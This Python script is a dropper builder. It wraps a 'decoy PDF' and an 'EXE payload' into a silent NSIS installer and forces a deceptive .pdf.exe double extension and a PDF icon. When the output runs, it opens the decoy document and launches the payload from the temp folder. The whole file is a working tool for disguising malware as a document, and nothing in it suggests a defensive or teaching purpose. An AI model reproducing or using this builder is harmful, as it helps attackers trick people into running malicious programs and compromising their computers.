import os
import subprocess
import tempfile
import shutil
import platform

PDF_ICON_NAME = "pdf_icon.ico"
LOCAL_ICON_PATH = os.path.join(os.path.dirname(__file__), PDF_ICON_NAME)

# Detect OS and set NSIS path accordingly
if platform.system() == "Windows":
    LOCAL_NSIS_PATH = os.path.join(os.path.dirname(__file__), 'nsis', 'makensis.exe')
elif platform.system() == "Linux":
    LOCAL_NSIS_PATH = "/usr/bin/makensis"  # assumes NSIS installed via package manager
else:
    raise OSError("Unsupported operating system")

def create_nsis_installer(pdf_path, exe_path, output_exe, nsis_path=LOCAL_NSIS_PATH):
    if not os.path.isfile(nsis_path):
        raise FileNotFoundError(f"[!] NSIS not found at {nsis_path}. Please install or include it properly.")

    if not os.path.isfile(LOCAL_ICON_PATH):
        raise FileNotFoundError(f"[!] Icon file not found at {LOCAL_ICON_PATH}. Please include 'pdf_icon.ico' in the repo.")

    temp_dir = tempfile.mkdtemp()
    pdf_name = os.path.basename(pdf_path)
    exe_name = os.path.basename(exe_path)
    nsis_script_path = os.path.join(temp_dir, 'installer.nsi')

    # Enforce .pdf.exe double extension
    if not output_exe.lower().endswith(".pdf.exe"):
        base_name = os.path.splitext(output_exe)[0]
        output_exe = base_name + ".pdf.exe"
    output_exe = os.path.abspath(output_exe)

    icon_path = os.path.join(temp_dir, PDF_ICON_NAME)

    # Copy files
    shutil.copy2(pdf_path, os.path.join(temp_dir, pdf_name))
    shutil.copy2(exe_path, os.path.join(temp_dir, exe_name))
    shutil.copy2(LOCAL_ICON_PATH, icon_path)

    # Create NSIS script
    with open(nsis_script_path, 'w') as f:
        f.write(f'''
OutFile "{output_exe}"
SilentInstall silent
RequestExecutionLevel user
Icon "{icon_path}"

Section "Main"
  SetOutPath "$TEMP"
  File "{pdf_name}"
  File "{exe_name}"
  ExecShell "open" "$TEMP\\{pdf_name}"
  ExecShell "open" "$TEMP\\{exe_name}"
SectionEnd
''')

    # Compile NSIS installer
    subprocess.run([nsis_path, nsis_script_path], check=True)
    shutil.rmtree(temp_dir)

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description="Create NSIS installer from PDF and EXE")
    parser.add_argument("pdf", help="Path to the decoy PDF")
    parser.add_argument("exe", help="Path to the EXE payload")
    parser.add_argument("output", help="Output final EXE")
    args = parser.parse_args()

    create_nsis_installer(args.pdf, args.exe, args.output)
    print(f"[+] Done. Final NSIS archive: {args.output}")
